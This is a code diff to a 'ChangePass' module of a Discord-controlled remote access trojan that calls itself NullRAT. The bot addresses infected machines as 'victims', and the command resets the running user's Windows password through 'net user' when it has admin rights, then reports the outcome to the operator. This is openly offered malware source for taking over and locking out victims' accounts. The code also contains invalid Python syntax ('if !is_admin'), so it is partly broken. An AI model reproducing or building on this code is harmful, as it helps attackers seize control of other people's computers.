@@ -16,19 +16,21 @@ class ChangePass(commands.Cog):
         Parameters
         ----------
         victim: Identifier of the affected computer (found via /listvictims).
-        password: new password to put in
+        password: New password to change for running user
         """
         
         if str(victim) == str(self.bot.identifier) or str(victim).lower() == "all":
-            try:
-                is_admin = os.getuid() == 0
-            except AttributeError:
-                is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
-             
+            
+            # Admin detection, this command will not work for regular users (apparently) 
+            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
             if !is_admin:
                 return await ctx.followup.send("NullRAT is not running as admin. Operation aborted")
             
             status = os.popen(r"net user %username% " + password).read()
+            if "success" in status.lower():
+                return await ctx.followup.send(fr"Success: Password changed to {password}")
+            
+            return await ctx.followup.send(fr"Unspecified error! Log: {status}")
 
 def setup(bot: commands.Bot):
     bot.add_cog(ChangePass(bot))
